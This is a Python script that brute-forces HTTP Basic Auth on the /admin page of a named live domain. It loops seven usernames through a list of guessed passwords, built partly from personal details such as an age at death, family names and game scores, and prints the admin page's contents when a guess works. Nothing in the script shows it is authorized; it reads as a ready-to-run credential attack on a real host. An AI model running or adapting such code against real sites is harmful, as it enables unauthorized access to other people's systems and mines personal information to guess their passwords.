#!/usr/bin/env python3
"""
SIMPLE PASSWORD BRUTE FORCE
Test the most obvious/simple passwords
"""

import requests
from requests.auth import HTTPBasicAuth

BASE_URL = "https://haian.de"

# The most obvious/simple passwords
SIMPLE_PASSWORDS = [
    # Just the number 5
    '5',
    '55',
    '555',
    '5555',
    '55555',
    
    # Age related
    '24',   # Age at death
    '25',   # Almost 25
    '52',   # Reversed 25
    '11',   # Months
    '20',   # Days before 25th
    
    # Skat numbers
    '120',
    '240',
    '24',
    
    # Thomas numbers
    '55',
    '60',
    '5560',
    '6055',
    
    # Combinations with 5
    '524',
    '5120',
    '55560',
    '52411',
    '5524',
    
    # Name + number
    'haian',
    'fabian',
    'haian5',
    'fabian5',
    '5haian',
    '5fabian',
    
    # Image size
    '700',
    '1000',
    '269508',
    
    # Common
    'admin',
    'password',
    '12345',
    'qwerty',
    'letmein',
    
    # German words
    'geheim',
    'passwort',
    'schlüssel',
    'tot',
    'tod',
    
    # The pixel 5 string itself
    "kO~4OI|jM^{[kD_SZ25`R8TRrsQSj\\a5b<F4pru445bE_O?BED52dqks8=RSVOSB?utAWhilWh8euz>Odiz|9kOkrt@@;DpN=Nn`_edl}MAB|~PCno>",
    
    # First/last parts of pixel string
    'kO~4O',
    'SZ25',
    '52dqk',
    'PCno>',
    'no>',
]

USERS = ['admin', 'haian', 'fabian', 'user', 'root', '5', '']

def simple_brute_force():
    print("="*70)
    print("SIMPLE PASSWORD BRUTE FORCE")
    print("="*70)
    
    url = f"{BASE_URL}/admin"
    total = len(USERS) * len(SIMPLE_PASSWORDS)
    
    print(f"\nTesting {len(USERS)} users × {len(SIMPLE_PASSWORDS)} passwords = {total} combinations")
    print(f"Target: {url}\n")
    
    count = 0
    for user in USERS:
        for pwd in SIMPLE_PASSWORDS:
            count += 1
            if count % 20 == 0:
                print(f"  Tested {count}/{total}...")
            
            try:
                r = requests.get(url, auth=HTTPBasicAuth(user, pwd), timeout=5)
                if r.status_code == 200:
                    print(f"\n[*** FOUND ***] User: '{user}' / Password: '{pwd}'")
                    print(f"\nResponse ({len(r.text)} chars):")
                    print("="*70)
                    print(r.text[:2000])
                    return (user, pwd, r.text)
            except Exception as e:
                pass
    
    print(f"\n[*] Tested {count} combinations - no match found")
    return None

if __name__ == "__main__":
    result = simple_brute_force()
    
    if result:
        print("\n" + "="*70)
        print("PASSWORD CRACKED!")
        print("="*70)
        print(f"Username: {result[0]}")
        print(f"Password: {result[1]}")
    else:
        print("\n" + "="*70)
        print("PASSWORD NOT FOUND IN SIMPLE SET")
        print("="*70)
